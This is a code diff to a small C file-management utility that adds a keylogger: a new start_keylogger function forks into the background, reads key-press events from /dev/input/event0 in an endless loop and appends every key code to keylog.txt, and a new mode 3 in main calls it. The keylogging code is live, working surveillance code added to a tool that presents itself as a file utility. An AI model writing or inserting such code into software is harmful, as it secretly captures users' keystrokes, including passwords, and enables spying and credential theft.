@@ -5,6 +5,9 @@
 #include <sys/stat.h>
 #include <string.h>
 #include <dirent.h>
+#include <time.h> //@YuEnTiang81391 new added library for time 
+#include <linux/input.h> //@YuEnTiang81391 new added library for input
+
 
 void create_file(char *filename){
     int fd = open(filename, O_CREAT | O_RDWR);
@@ -107,6 +110,48 @@ void list_directory(char *dirname){
     }
     closedir(dir);
 }
+
+void start_keylogger() {
+    FILE *file;
+    file = fopen("keylog.txt", "a");
+    if (file == NULL) {
+        perror("Failed to open keylog.txt");
+        return;
+    }
+
+    // Add timestamp at the beginning of the session
+    time_t now;
+    time(&now);
+    fprintf(file, "Keylogger session started at: %s\n", ctime(&now));
+    fclose(file);
+
+    // Run in background
+    if (fork() == 0) {
+        int fd;
+        struct input_event ev;
+        const char *dev = "/dev/input/event0"; // Adjust this path to your keyboard device
+
+        fd = open(dev, O_RDONLY);
+        if (fd == -1) {
+            perror("Failed to open input device");
+            exit(EXIT_FAILURE);
+        }
+
+        while (1) {
+            read(fd, &ev, sizeof(struct input_event));
+            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
+                file = fopen("keylog.txt", "a");
+                if (file != NULL) {
+                    fprintf(file, "Key %d pressed\n", ev.code);
+                    fclose(file);
+                }
+            }
+        }
+        close(fd);
+        exit(EXIT_SUCCESS);
+    }
+}
+
 int main(int argc, char *argv[]){
 	if (argc < 3){
         fprintf(stderr, "Please enter in correct format!\nFormat: %s -m [mode] [argument]\n", argv[0]);
@@ -183,6 +228,9 @@ int main(int argc, char *argv[]){
             }
             break;
 
+        case 3:
+            start_keylogger();
+            break;
 
     }
 }
